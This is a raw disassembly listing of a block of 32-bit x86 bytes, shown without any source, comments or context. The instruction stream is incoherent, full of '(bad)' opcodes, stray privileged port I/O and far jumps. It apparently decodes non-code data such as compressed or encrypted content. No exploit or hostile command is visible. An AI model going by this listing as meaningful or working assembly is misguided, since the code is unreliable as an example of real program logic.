  421d7f:	fimul  WORD PTR [edx]
  421d81:	retf   0x866e
  421d84:	aaa    
  421d85:	imul   edx,DWORD PTR [ecx],0x1f846a6d
  421d8b:	jb     0x421d9b
  421d8d:	or     al,0x57
  421d8f:	and    BYTE PTR [ebp-0x2d],al
  421d92:	inc    esp
  421d93:	mov    ds:0xc2d47769,al
  421d98:	jbe    0x421d82
  421d9a:	mov    ah,0x43
  421d9c:	mov    eax,ds:0x9fa8d16c
  421da1:	mov    DWORD PTR [ecx],edi
  421da3:	xchg   esi,eax
  421da4:	retf   
  421da5:	cld    
  421da6:	add    ah,BYTE PTR [eax]
  421da8:	inc    esp
  421da9:	add    cl,BYTE PTR [edi+ebp*4]
  421dac:	cs adc eax,0xb240c5d4
  421db2:	sar    DWORD PTR [esi-0x7b],cl
  421db5:	sub    bh,BYTE PTR [esi+ecx*2]
  421db8:	inc    edi
  421db9:	xor    bl,dl
  421dbb:	hlt    
  421dbc:	or     cl,al
  421dbe:	retf   0xc64a
  421dc1:	mov    dh,0x52
  421dc3:	xchg   esi,eax
  421dc4:	sti    
  421dc5:	mov    DWORD PTR [esp+ecx*8-0x4d],ebx
  421dc9:	int3   
  421dca:	cmp    al,0x11
  421dcc:	into   
  421dcd:	add    dh,dh
  421dcf:	fiadd  DWORD PTR [edx+0x32]
  421dd2:	sub    DWORD PTR [eax+0xc],esp
  421dd5:	hlt    
  421dd6:	jecxz  0x421dbd
  421dd8:	xchg   edi,eax
  421dd9:	paddd  mm2,QWORD PTR [ecx+0x4]
  421ddd:	and    eax,0x64bbe10e
  421de2:	stc    
  421de3:	sub    esi,ebp
  421de5:	pop    eax
  421de6:	pop    ds
  421de7:	in     eax,0x1
  421de9:	out    dx,eax
  421dea:	cmp    dl,BYTE PTR [ebp+ebp*1-0x1c33ae75]
  421df1:	sti    
  421df2:	mov    eax,0x11a2987e
  421df7:	loop   0x421e3c
  421df9:	daa    
  421dfa:	lock and eax,0xe0512c20
  421e00:	sbb    ah,BYTE PTR [esi]
  421e02:	inc    eax
  421e03:	cmp    BYTE PTR [ebp+0x53],bl
  421e06:	jecxz  0x421d9a
  421e08:	fimul  DWORD PTR [edi]
  421e0a:	test   BYTE PTR es:[ecx-0x7c],ah
  421e0e:	xor    DWORD PTR [ebx],esi
  421e10:	pop    edx
  421e11:	or     al,0xbc
  421e13:	pop    edx
  421e14:	test   eax,0xc8857d18
  421e19:	inc    edx
  421e1a:	and    eax,0x26b33abe
  421e1f:	push   cs
  421e20:	das    
  421e21:	dec    esi
  421e22:	inc    edx
  421e23:	imul   edx,eax,0x6b
  421e26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e27:	mov    cs,WORD PTR [ecx-0x65263caa]
  421e2d:	dec    ebp
  421e2e:	enter  0x1c27,0x34
  421e32:	sbb    DWORD PTR [ecx+0x2e],0xffffffca
  421e36:	aaa    
  421e37:	jae    0x421e69
  421e39:	out    dx,al
  421e3a:	fst    DWORD PTR [ebx]
  421e3c:	popa   
  421e3d:	xor    eax,0xe4904f8f
  421e42:	ds add al,0x10
  421e45:	fild   QWORD PTR [edi+0x18ebb74c]
  421e4b:	pop    eax
  421e4c:	push   es
  421e4d:	adc    eax,0x1dd6cd01
  421e52:	push   eax
  421e53:	adc    ebp,DWORD PTR [ecx-0x8]
  421e56:	iret   
  421e57:	inc    ebp
  421e58:	inc    esi
  421e59:	mov    bl,0x1e
  421e5b:	icebp  
  421e5c:	jns    0x421e5f
  421e5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e5f:	or     esp,DWORD PTR [edi-0x3e]
  421e62:	std    
  421e63:	retf   0x566f
  421e66:	mov    al,0xa8
  421e68:	push   esp
  421e69:	loop   0x421eab
  421e6b:	es jge 0x421df8
  421e6e:	test   eax,0x176b35ea
  421e73:	push   edi
  421e74:	xor    al,0xdb
  421e76:	mov    ebx,0xe83e3bd5
  421e7b:	add    cl,BYTE PTR ds:0xa1bef374
  421e81:	jne    0x421e79
  421e83:	xor    al,BYTE PTR [edx]
  421e85:	push   ecx
  421e86:	test   al,0x71
  421e88:	sbb    eax,0x493dccd0
  421e8d:	or     DWORD PTR [eax],0xffffff96
  421e90:	add    DWORD PTR [edx+ebx*2],ebp
  421e93:	and    eax,DWORD PTR ds:0xe8b103a
  421e99:	fsub   DWORD PTR [ebp-0x18]
  421e9c:	xor    al,0xdd
  421e9e:	pop    ebx
  421e9f:	cmp    al,BYTE PTR [edx+0x46]
  421ea2:	cmp    BYTE PTR [ebx+0x129c5789],bh
  421ea8:	or     ebx,DWORD PTR [ebp-0x771b621d]
  421eae:	cmc    
  421eaf:	pusha  
  421eb0:	loopne 0x421e9a
  421eb2:	dec    ebx
  421eb3:	jge    0x421f29
  421eb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421eb6:	and    eax,0x3df21069
  421ebb:	imul   eax,DWORD PTR [ebx+0x7b],0x4ddf8b2
  421ec2:	cmp    DWORD PTR [eax-0xf],0x7ae330d2
  421ec9:	cmp    DWORD PTR [edi],ecx
  421ecb:	(bad)  
  421ecc:	add    al,0x3f
  421ece:	repz add al,0xfb
  421ed1:	pop    ebx
  421ed2:	cmp    ebx,DWORD PTR [edx]
  421ed4:	adc    ecx,eax
  421ed6:	std    
  421ed7:	sub    esp,DWORD PTR [edi]
  421ed9:	lock and al,0x54
  421edc:	std    
  421edd:	(bad)  
  421ede:	jge    0x421f4b
  421ee0:	jmp    0x421eb7
  421ee2:	hlt    
  421ee3:	shl    BYTE PTR [esi-0x27bc46b4],0xeb
  421eea:	xlat   BYTE PTR ds:[ebx]
  421eeb:	ja     0x421ebb
  421eed:	push   es
  421eee:	pop    edi
  421eef:	enter  0x4533,0x49
  421ef3:	lods   al,BYTE PTR ds:[esi]
  421ef4:	or     BYTE PTR [edi-0x7d201488],dh
  421efa:	lahf   
  421efb:	mov    bh,bh
  421efd:	shr    BYTE PTR [ebp+0x7b],cl
  421f00:	inc    esi
  421f01:	in     eax,0x82
  421f03:	sub    DWORD PTR [ebp-0x15],esp
  421f06:	loopne 0x421e9f
  421f08:	jmp    0x2d926256
  421f0d:	repnz cmc 
  421f0f:	out    dx,al
  421f10:	lea    esi,[ebx-0x45]
  421f13:	and    eax,0xd3ff9b2e
  421f18:	cmp    BYTE PTR [eax-0xf066024],dh
  421f1e:	(bad)  
  421f20:	sub    al,0xc0
  421f22:	ins    BYTE PTR es:[edi],dx
  421f23:	mov    al,0xa9
  421f25:	in     eax,0xe1
  421f27:	cmp    eax,0xf592bf47
  421f2c:	push   cs
  421f2d:	jecxz  0x421f29
  421f2f:	jnp    0x421ebc
  421f31:	ror    esi,cl
  421f33:	push   esp
  421f34:	xor    esp,edx
  421f36:	adc    BYTE PTR [edi],ch
  421f38:	jo     0x421fa8
  421f3a:	cmp    esp,DWORD PTR [ecx-0x80]
  421f3d:	xchg   esp,eax
  421f3e:	xchg   ebp,eax
  421f3f:	repnz inc edi
  421f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f42:	jnp    0x421ed5
  421f44:	pop    ss
  421f45:	dec    esp
  421f46:	and    ebx,DWORD PTR [ebp-0x51]
  421f49:	xchg   edx,eax
  421f4a:	push   ebx
  421f4b:	rcl    BYTE PTR [ebp+ebx*4+0x72],cl
  421f4f:	or     DWORD PTR [ecx],eax
  421f51:	icebp  
  421f52:	jns    0x421fa8
  421f54:	retf   
  421f55:	push   ebp
  421f56:	retf   0xc391
  421f59:	pushf  
  421f5a:	retf   0x8d2c
  421f5d:	mov    dl,0xe8
  421f5f:	sbb    esi,eax
  421f61:	jle    0x421f57
  421f63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f64:	sar    esp,0xb7
  421f67:	dec    eax
  421f68:	pop    bp
  421f6a:	add    al,BYTE PTR [edx+0xf88ff8]
	...
  421f78:	add    BYTE PTR [eax],al
  421f7a:	out    dx,al
  421f7b:	ret    0x2d9d
  421f7e:	mov    ebp,0x33c3fe7f
  421f83:	ja     0x421f4e
  421f85:	or     BYTE PTR [edi],ah
  421f87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f88:	fst    DWORD PTR [ecx]
  421f8a:	in     al,0x9a
  421f8c:	add    DWORD PTR [eax],eax
  421f8e:	std    
  421f8f:	add    DWORD PTR [eax],eax
  421f91:	add    bl,dh
  421f93:	ds ret 
  421f95:	mov    cl,al
  421f97:	out    dx,al
  421f98:	or     DWORD PTR [esi],eax
  421f9a:	out    dx,eax
  421f9b:	cmp    BYTE PTR [edx],al
  421f9d:	sub    eax,0xed4e4caa
  421fa2:	test   eax,0x26bbd770
  421fa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fa8:	(bad)  
  421faa:	or     DWORD PTR [ebp+0x52],0x53583202
  421fb1:	fdiv   DWORD PTR [edx+ecx*1]
  421fb4:	aaa    
  421fb5:	or     eax,DWORD PTR ds:0x74869cd8
  421fbb:	cwde   
  421fbc:	xchg   ebx,eax
  421fbd:	loope  0x42203a
  421fbf:	and    BYTE PTR [ebx+0x70],bl
  421fc2:	xchg   edi,eax
  421fc3:	mov    ebx,0xb7eb5d03
  421fc8:	cli    
  421fc9:	dec    edi
  421fca:	inc    esi
  421fcb:	jl     0x421fb8
  421fcd:	mov    ebp,0x44bd9d5e
  421fd2:	mov    DWORD PTR [ebx+eiz*4-0x4b29c1ea],esp
  421fd9:	xor    al,BYTE PTR [esi+0x7b]
  421fdc:	stos   BYTE PTR es:[edi],al
  421fdd:	and    al,0x2a
  421fdf:	xchg   edx,eax
  421fe0:	mov    es,WORD PTR [ebx+esi*4]
  421fe3:	mov    esp,0x90538867
  421fe8:	test   BYTE PTR [edi+ecx*4-0x74e195c5],bh
  421fef:	cmp    BYTE PTR [edx-0x77],ch
  421ff2:	fild   QWORD PTR cs:[ecx-0x4d]
  421ff6:	(bad)  
  421ff7:	fsub   QWORD PTR [ecx]
  421ff9:	pusha  
  421ffa:	or     eax,0x82941b6f
  421fff:	outs   dx,BYTE PTR ds:[esi]
  422000:	(bad)  
  422001:	adc    edi,DWORD PTR [edx-0x64]
  422004:	jecxz  0x42200b
  422006:	out    dx,eax
  422007:	mov    edx,ebx
  422009:	test   al,0xcc
  42200b:	or     bh,BYTE PTR fs:0x8570c0b4
  422012:	xor    ebp,esp
  422014:	pop    DWORD PTR [ebx+0x65]
  422017:	jne    0x42206b
  422019:	push   0x74e8b5e7
  42201e:	cs nop
  422020:	out    0x79,eax
  422022:	add    edi,DWORD PTR fs:[ecx+0x9]
  422026:	jae    0x42207c
  422028:	je     0x421ffa
  42202a:	fwait
  42202b:	iret   
  42202c:	js     0x421fff
  42202e:	sgdtd  [esi+0x7f]
  422032:	loope  0x422068
  422034:	bound  ebp,QWORD PTR [esi-0x25]
  422037:	cmc    
  422038:	add    al,0x88
  42203a:	add    DWORD PTR [ebx+0x5e],esp
  42203d:	push   esp
  42203e:	pop    ss
  42203f:	sbb    BYTE PTR [eax-0x3],0xcf
  422043:	in     al,dx
  422044:	pop    ebp
  422045:	and    DWORD PTR [edi+0x40],0xffffffa6
  422049:	pop    esi
  42204a:	lock ins DWORD PTR es:[edi],dx
  42204c:	inc    edi
  42204d:	ins    DWORD PTR es:[edi],dx
  42204e:	dec    ebp
  42204f:	jae    0x4220a3
  422051:	gs jns 0x422070
  422054:	out    0xf1,eax
  422056:	fldenv [esi-0x5d]
  422059:	dec    edx
  42205a:	test   eax,0x4ca25522
  42205f:	outs   dx,BYTE PTR ds:[esi]
  422060:	hlt    
  422061:	div    DWORD PTR ds:0x1b5ab837
  422067:	inc    eax
  422068:	xor    al,0x71
  42206a:	pop    eax
  42206b:	mul    eax
  42206d:	xchg   esp,eax
  42206e:	sub    DWORD PTR [ecx+0x78],esp
  422071:	sub    al,0x2d
  422073:	nop
  422074:	stos   BYTE PTR es:[edi],al
  422075:	mov    dl,0x3c
  422077:	dec    eax
  422078:	sar    BYTE PTR [ebx*8-0x13730514],cl
  42207f:	call   0xae40ee57
  422084:	(bad)  
  422085:	xchg   ebp,eax
  422086:	(bad)  
  422087:	mov    ebp,0x4c07dad2
  42208c:	ins    BYTE PTR es:[edi],dx
  42208d:	push   edx
  42208e:	push   es
  42208f:	leave  
  422090:	inc    esi
  422091:	mov    cl,0xf5
  422093:	and    al,0xe2
  422095:	push   edx
  422096:	jmp    0xe21f:0xb012c0b2
  42209d:	dec    edi
  42209e:	sub    DWORD PTR ss:[ebp-0x17a70249],0xffffffba
  4220a6:	movaps xmm0,XMMWORD PTR [ecx+0x5764dd1]
  4220ad:	inc    ecx
  4220ae:	cmc    
  4220af:	aad    0x14
  4220b1:	popa   
  4220b2:	or     al,0x2a
  4220b4:	dec    edi
  4220b5:	xchg   ebx,eax
  4220b6:	fs ins BYTE PTR es:[edi],dx
  4220b8:	es push eax
  4220ba:	cmp    DWORD PTR [esp+ecx*8+0x6a945b88],edi
  4220c1:	stc    
  4220c2:	dec    eax
  4220c3:	xchg   BYTE PTR [edx],dh
  4220c5:	xchg   ebp,eax
  4220c6:	test   BYTE PTR [edi],0xb
  4220c9:	test   edi,esi
  4220cb:	jmp    0x422053
  4220cd:	lahf   
  4220ce:	inc    ebp
  4220cf:	pop    edx
  4220d0:	cmp    ebp,ebx
  4220d2:	loop   0x4220be
  4220d4:	inc    eax
  4220d5:	add    al,0xf5
  4220d7:	sub    DWORD PTR [esi+0x40],0x25
  4220db:	push   eax
  4220dc:	xor    BYTE PTR [ebx-0x3a],al
  4220df:	test   al,ah
  4220e1:	fwait
  4220e2:	pop    edx
  4220e3:	sub    al,0x38
  4220e5:	stos   DWORD PTR es:[edi],eax
  4220e6:	push   eax
  4220e7:	aam    0x4c
  4220e9:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220eb:	ja     0x42213e
  4220ed:	push   0x25c6f4c3
  4220f2:	dec    bx
  4220f4:	sahf   
  4220f5:	jle    0x422131
  4220f7:	data16 fidivr DWORD PTR [ecx-0x9]
  4220fb:	test   eax,0x52df4e90
  422100:	(bad)  [ebx]
  422102:	hlt    
  422103:	cmp    eax,0xa2827482
  422108:	jmp    0x6c02:0x7410435e
  42210f:	clc    
  422110:	pop    edi
  422111:	jecxz  0x4220a0
  422113:	cmp    al,0x99
  422115:	sbb    al,BYTE PTR [ebp+eiz*8-0x50]
  422119:	pop    ecx
  42211a:	in     eax,0x89
  42211c:	pop    ecx
  42211d:	ins    BYTE PTR es:[edi],dx
  42211e:	jmp    0xbd7c:0x9448b4e2
  422125:	jno    0x422148
  422127:	xchg   ecx,eax
  422128:	(bad)  
  422129:	nop
  42212a:	mov    ch,0x44
  42212c:	jp     0x422145
  42212e:	cwde   
  42212f:	es std 
  422131:	fild   DWORD PTR [edx]
  422133:	rol    BYTE PTR [esi],1
  422135:	inc    edi
  422136:	xchg   ebp,eax
  422137:	cmp    ebp,DWORD PTR [ebp-0x73]
  42213a:	arpl   WORD PTR [eax-0x63],dx
  42213d:	xor    DWORD PTR [edx+0x67],eax
  422140:	mov    al,0x2f
  422142:	push   es
  422143:	cmc    
  422144:	sub    DWORD PTR [eax],esp
  422146:	push   es
  422147:	popf   
  422148:	mov    dl,0x19
  42214a:	out    dx,al
  42214b:	out    dx,eax
  42214c:	sub    dh,BYTE PTR [ebp+0x21]
  42214f:	cmp    DWORD PTR [esi-0x5a5eb12b],esi
  422155:	popa   
  422156:	or     cl,BYTE PTR [ecx-0x18]
  422159:	fiadd  WORD PTR [edi]
  42215b:	out    0xc3,eax
  42215d:	ror    bh,cl
  42215f:	ja     0x422170
  422161:	lods   al,BYTE PTR ds:[esi]
  422162:	inc    esp
  422163:	mov    ah,BYTE PTR [ecx+0x2e118d21]
  422169:	push   ds
  42216a:	xchg   esi,eax
  42216b:	js     0x422130
  42216d:	or     bl,BYTE PTR [edx]
  42216f:	ja     0x4221a9
  422171:	mov    edi,0x69634436
  422176:	mov    ebx,0xe2245afe
  42217b:	dec    edx
  42217c:	(bad)  
  42217d:	pop    esp
  42217e:	sub    BYTE PTR [ecx],al
  422180:	sub    al,0x13
  422182:	imul   edx,DWORD PTR [edx],0x1b560771
  422188:	mov    ?,WORD PTR [esi+edx*4-0x15207e79]
	...
  422197:	add    BYTE PTR [eax],al
  422199:	add    BYTE PTR [ebx-0x2a],dl
  42219c:	(bad)  
  42219d:	push   esi
  42219e:	(bad)  
  42219f:	jle    0x42219c
  4221a1:	xlat   BYTE PTR ds:[ebx]
  4221a2:	retf   
  4221a3:	push   ds
  4221a4:	test   DWORD PTR [ebp-0xc],0xe1d8bde7
  4221ab:	pushf  
  4221ac:	add    DWORD PTR [eax],eax
  4221ae:	std    
  4221af:	add    DWORD PTR [eax],eax
  4221b1:	add    BYTE PTR [eax],dl
  4221b3:	add    bl,BYTE PTR [edx+0x7c]
  4221b6:	lods   al,BYTE PTR ds:[esi]
  4221b7:	aaa    
  4221b8:	enter  0x9de2,0xdf
  4221bc:	retf   
  4221bd:	fnsave [ecx-0x28]
  4221c0:	(bad)  
  4221c1:	mov    eax,0xb5de248d
  4221c6:	(bad)  
  4221c7:	ins    BYTE PTR es:[edi],dx
  4221c8:	jmp    0x422226
  4221ca:	(bad)  [esp+esi*1]
  4221cd:	xchg   edi,eax
  4221ce:	jl     0x42224f
  4221d0:	inc    edx
  4221d1:	ins    BYTE PTR es:[edi],dx
  4221d2:	add    BYTE PTR [edx+0x9439fe3],ch
  4221d8:	bound  esp,QWORD PTR [esi+eax*8]
  4221db:	scas   al,BYTE PTR es:[edi]
  4221dc:	push   0xf
  4221de:	test   ecx,ecx
  4221e0:	nop
  4221e1:	add    BYTE PTR [edi+0x65],ah
  4221e4:	cli    
  4221e5:	push   ss
  4221e6:	shr    BYTE PTR [ebx+ebp*1-0x767068e3],cl
  4221ed:	pusha  
  4221ee:	out    dx,eax
  4221ef:	iret   
  4221f0:	jge    0x42219c
  4221f2:	dec    eax
  4221f3:	or     DWORD PTR [esi+edx*1+0x5c5a0854],edx
  4221fa:	aam    0x26
  4221fc:	sbb    bh,BYTE PTR [esi]
  4221fe:	mov    ds:0xdab5fb72,eax
  422203:	sub    dl,BYTE PTR [esi+0x7f]
  422206:	ret    0x514d
  422209:	and    al,0xc0
  42220b:	int    0xb7
  42220d:	loope  0x4221db
  42220f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422210:	lds    eax,FWORD PTR [edx]
  422212:	cmp    ecx,DWORD PTR [edi+0x1a]
  422215:	mov    bl,0x64
  422217:	aad    0x7b
  422219:	lock aad 0x8f
  42221c:	jge    0x4221f5
  42221e:	data16 icebp 
  422220:	pop    es
  422221:	pop    ebp
  422222:	mov    esp,0x1d1a2a7a
  422227:	call   FWORD PTR [edi]
  422229:	jp     0x42221a
  42222b:	lock das 
  42222d:	add    dh,BYTE PTR [ebp-0x7dc5ec09]
  422233:	inc    ebx
  422234:	loop   0x422244
  422236:	lock repnz or edi,ebp
  42223a:	mov    bh,0xaa
  42223c:	(bad)  
  42223d:	jge    0x422252
  42223f:	int3   
  422240:	jnp    0x4221de
  422242:	inc    ebp
  422243:	loope  0x422288
  422245:	rol    DWORD PTR [ecx-0x745b2e61],0xb6
  42224c:	div    BYTE PTR [ebp+0x28642ba]
  422252:	shl    BYTE PTR [edx],0x2f
  422255:	pushf  
  422256:	popa   
  422257:	adc    ebx,DWORD PTR ds:0x2906d407
  42225d:	fwait
  42225e:	mov    ds:0x1280924a,al
  422263:	push   esp
  422264:	xchg   DWORD PTR [ebp-0x78],edi
  422267:	scas   eax,DWORD PTR es:[edi]
  422268:	lods   al,BYTE PTR ds:[esi]
  422269:	sbb    edi,0xd95c059b
  42226f:	lods   eax,DWORD PTR ds:[esi]
  422270:	(bad)  
  422271:	dec    eax
  422272:	mov    ebp,0x9f67bd41
  422277:	xchg   ebx,eax
  422278:	xchg   ecx,eax
  422279:	outs   dx,DWORD PTR ds:[esi]
  42227a:	adc    eax,0x3f6e5ada
  42227f:	or     eax,0xf4dc7fa2
  422284:	loopne 0x4222c5
  422286:	and    eax,0xaa69739d
  42228b:	or     DWORD PTR [edi+0x63],0xffffffac
  42228f:	call   0xbdea:0x6326f188
  422296:	add    dh,BYTE PTR [ecx+0x3c64101d]
  42229c:	pop    es
  42229d:	out    0xdb,eax
  42229f:	ins    DWORD PTR es:[edi],dx
  4222a0:	inc    esi
  4222a1:	xchg   DWORD PTR [ebp+eax*2+0x75],esp
  4222a5:	adc    al,0xdf
  4222a7:	mov    BYTE PTR [esi-0x41],0xb0
  4222ab:	add    eax,0xaeb3ece6
  4222b0:	jbe    0x422252
  4222b2:	lods   al,BYTE PTR ds:[esi]
  4222b3:	mov    eax,ds:0xf37bf979
  4222b8:	jo     0x42229e
  4222ba:	sub    eax,0x9839ad9e
  4222bf:	in     al,0xb8
  4222c1:	into   
  4222c2:	mov    al,ds:0x6acbabcd
  4222c7:	lea    ebx,ds:0x1b4622f2
  4222cd:	mov    bl,0x78
  4222cf:	lods   eax,DWORD PTR ds:[esi]
  4222d0:	sbb    eax,0x8ae36c3a
  4222d5:	inc    edi
  4222d6:	push   0x2c60798
  4222db:	push   ebp
  4222dc:	mov    esi,0xc70f4dc4
  4222e1:	shl    DWORD PTR ds:[ecx+0x11],0xbe
  4222e6:	mov    eax,0xb2f66340
  4222eb:	push   cs
  4222ec:	cs mov esp,0xe976296c
  4222f2:	setbe  BYTE PTR [edx+0x7a5fbe5f]
  4222f9:	fst    QWORD PTR ds:0xadb4bcb6
  4222ff:	mov    bh,0xc1
  422301:	cwde   
  422302:	cdq    
  422303:	pushf  
  422304:	add    eax,DWORD PTR [ebp-0x3c1a5ea7]
  42230a:	rol    BYTE PTR [ecx+0x2ffd02a8],1
  422310:	jl     0x422300
  422312:	sub    DWORD PTR [ecx],ecx
  422314:	jbe    0x422307
  422316:	cmp    edi,DWORD PTR [eax-0x44]
  422319:	sahf   
  42231a:	into   
  42231b:	mov    al,ds:0xac287cd2
  422320:	(bad)  
  422321:	sbb    BYTE PTR [eax],dl
  422323:	add    al,0xf5
  422325:	outs   dx,DWORD PTR ds:[esi]
  422326:	push   ebp
  422327:	sub    edx,DWORD PTR [edx+eax*4+0xb]
  42232b:	(bad)  
  42232d:	lea    edx,ds:0xb3cd4910
  422333:	sbb    DWORD PTR [ecx+ebx*8],edi
  422336:	jp     0x4222f7
  422338:	xor    eax,0xd7d3b533
  42233d:	cmpxchg DWORD PTR [edx+0x5d],ebp
  422341:	pop    ds
  422342:	ror    edi,1
  422344:	out    0x4b,al
  422346:	mov    al,ds:0x989ef9d4
  42234b:	stc    
  42234c:	and    BYTE PTR [eax],ch
  42234e:	addr16 jnp 0x422355
  422351:	(bad)  
  422352:	mov    esp,0xa14fa82
  422357:	arpl   si,cx
  422359:	cmp    bh,BYTE PTR [eax]
  42235b:	adc    dl,dh
  42235d:	lds    ebx,FWORD PTR [edx-0x12e92587]
  422363:	add    bh,bh
  422365:	shl    dl,0xf7
  422368:	bnd ret 0x1b1e
  42236c:	mov    edx,0xb40af1bd
  422371:	arpl   WORD PTR [edx],bp
  422373:	addr16 jo 0x4223f1
  422376:	add    eax,0x14cd44d4
  42237b:	inc    ebx
  42237c:	xchg   DWORD PTR [esi],ecx
  42237e:	xchg   esp,eax
  42237f:	adc    BYTE PTR [edi+0x274416dd],0x20
  422386:	out    dx,al
  422387:	jmp    DWORD PTR [ecx]
  422389:	xchg   esp,eax
  42238a:	and    BYTE PTR [esi+0x2b543faa],al
  422390:	shl    al,1
  422392:	add    eax,0x6c5703da
  422397:	cmp    esi,DWORD PTR [ebp+0x7b51bd65]
  42239d:	xchg   DWORD PTR [eax+0x5ef67753],ecx
  4223a3:	shl    BYTE PTR [edi+0x59],cl
  4223a6:	mov    ds:0x70edb77c,al
  4223ab:	stc    
  4223ac:	out    0xa2,eax
  4223ae:	or     eax,0x0
  4223b3:	add    BYTE PTR [eax],al
  4223b5:	add    BYTE PTR [eax],al
  4223b7:	add    BYTE PTR [eax],al
  4223b9:	add    BYTE PTR [ecx],dl
  4223bb:	push   cs
  4223bc:	or     dl,ch
  4223be:	pop    ds
  4223bf:	out    dx,al
  4223c0:	repz jmp FWORD PTR [ecx-0x6c]
  4223c4:	fucomp st(0)
  4223c6:	xor    DWORD PTR [ecx],ebx
  4223c8:	or     cl,cl
  4223ca:	ficomp WORD PTR [esi+0x1fd0001]
  4223d0:	add    BYTE PTR [eax],al
  4223d2:	in     eax,0x76
  4223d4:	sbb    eax,0xcb230b86
  4223d9:	cmp    al,0x97
  4223db:	pop    ebp
  4223dc:	sbb    BYTE PTR [eax+eiz*4+0x28e45189],ch
  4223e3:	aad    0xd9
  4223e5:	jno    0x4223c6
  4223e7:	out    dx,eax
  4223e8:	das    
  4223e9:	cld    
  4223ea:	sbb    dh,0xe6
  4223ed:	in     al,dx
  4223ee:	sahf   
  4223ef:	cld    
  4223f0:	push   ebx
  4223f1:	mov    edi,0x9096b36b
  4223f6:	cmp    DWORD PTR [edi-0x37],ebp
  4223f9:	fnstcw WORD PTR [ebx-0x3c35783]
  4223ff:	imul   edx,esp,0x3e307f90
  422405:	repz jmp 0x422461
  422408:	mov    ebx,0xf2042226
  42240d:	sbb    al,0xbf
  42240f:	sbb    eax,0x6d0f80ea
  422414:	nop
  422415:	punpckhbw mm4,mm2
  422418:	call   0xd9e:0xb08932c4
  42241f:	jp     0x4223b9
  422421:	bound  eax,QWORD PTR ds:0xbc35e9a8
  422427:	stc    
  422428:	repz and edx,edi
  42242b:	jmp    0x4223b4
  42242d:	adc    bl,bl
  42242f:	das    
  422430:	inc    edx
  422431:	jmp    0xb3fa:0x5b619cbe
  422438:	add    al,0xdb
  42243a:	loop   0x42244d
  42243c:	int    0x74
  42243e:	aam    0xc6
  422440:	sub    ecx,DWORD PTR [ebx+0x768df8df]
  422446:	push   edi
  422447:	fs jmp edx
  42244a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42244b:	shl    DWORD PTR [eax+0x20701ef5],0x4d
  422452:	mov    al,ds:0x7b15d361
  422457:	pop    esp
  422458:	xor    eax,0xd08b8cc6
  42245d:	jne    0x42248c
  42245f:	jno    0x42243d
  422461:	pop    ecx
  422462:	xor    ebx,ebp
  422464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422465:	jno    0x422489
  422467:	lods   eax,DWORD PTR fs:[esi]
  422469:	xchg   esi,eax
  42246a:	xchg   DWORD PTR [eax+0x4a],edi
  42246d:	add    DWORD PTR [eax-0x6c02a828],esi
  422473:	ror    bh,1
  422475:	jno    0x4224d0
  422477:	mov    eax,0xd1e5c493
  42247c:	in     eax,0x98
  42247e:	lahf   
  42247f:	inc    ebp
  422480:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422481:	mov    al,dl
  422483:	sbb    eax,0x1c249a08
  422488:	xor    eax,0xc7960f2c
  42248d:	push   ds
  42248e:	sbb    eax,0xe6136fc1
  422493:	imul   ecx,DWORD PTR [ebp-0x44],0xc956ca69
  42249a:	sbb    al,0x62
  42249c:	push   eax
  42249d:	and    al,0xdf
  42249f:	or     dl,0xae
  4224a2:	ins    BYTE PTR es:[edi],dx
  4224a3:	dec    ecx
  4224a4:	addr16 mov al,ds:0xe8ff
  4224a8:	dec    ecx
  4224a9:	jb     0x4224d8
  4224ab:	loopne 0x4224b2
  4224ad:	sub    al,0x8f
  4224af:	in     al,dx
  4224b0:	xlat   BYTE PTR ds:[ebx]
  4224b1:	jne    0x42250b
  4224b3:	or     eax,0xb606c3e3
  4224b8:	push   ss
  4224b9:	and    DWORD PTR [esi+0x11cb9006],edx
  4224bf:	fild   DWORD PTR [ebx+0x33]
  4224c2:	xchg   esp,eax
  4224c3:	jle    0x422488
  4224c5:	icebp  
  4224c6:	in     eax,0x43
  4224c8:	sbb    ah,BYTE PTR [ebp+0x949cc5e]
  4224ce:	jno    0x42253a
  4224d0:	lods   eax,DWORD PTR ds:[esi]
  4224d1:	repz imul ebx,DWORD PTR [edi],0x74
  4224d5:	mov    edx,0x4233b274
  4224da:	sbb    BYTE PTR [ecx+0x11b97627],ch
  4224e0:	clc    
  4224e1:	test   eax,0x2ad76e4e
  4224e6:	mov    ebp,0xe235c761
  4224eb:	lahf   
  4224ec:	push   ecx
  4224ed:	jmp    0x869b:0x6f27e2bd
  4224f4:	mov    ah,0x88
  4224f6:	adc    esp,0x6bf8a0a0
  4224fc:	pop    esp
  4224fd:	adc    DWORD PTR [ebx+0x6c9c48f5],eax
  422503:	hlt    
  422504:	fmul   st(7),st
  422506:	ins    DWORD PTR es:[edi],dx
  422507:	in     eax,dx
  422508:	add    ch,al
  42250a:	sbb    al,0xcf
  42250c:	dec    ebp
  42250d:	cmp    BYTE PTR [ebx],bh
  42250f:	(bad)  
  422511:	cld    
  422512:	cmp    al,0x84
  422514:	jge    0x4224a6
  422516:	and    ebp,eax
  422518:	ss aam 0x96
  42251b:	nop
  42251c:	dec    edx
  42251d:	add    al,0x6
  42251f:	jg     0x42254a
  422521:	inc    esi
  422522:	leave  
  422523:	out    0xd0,al
  422525:	mov    esp,DWORD PTR [eax-0x7c08baea]
  42252b:	sbb    al,0x70
  42252d:	inc    edi
  42252e:	idiv   BYTE PTR ds:0xb9929372
  422534:	jns    0x4224d5
  422536:	push   ds
  422537:	arpl   WORD PTR [edi+0x3060a856],bx
  42253d:	dec    ebx
  42253e:	or     ecx,edi
  422540:	xchg   ebp,eax
  422541:	pop    ss
  422542:	xor    BYTE PTR [edx+0x742137e8],bl
  422548:	fwait
  422549:	inc    edx
  42254a:	lods   al,BYTE PTR ds:[esi]
  42254b:	or     al,0x63
  42254d:	mov    eax,ds:0x7c3a6fe8
  422552:	push   ds
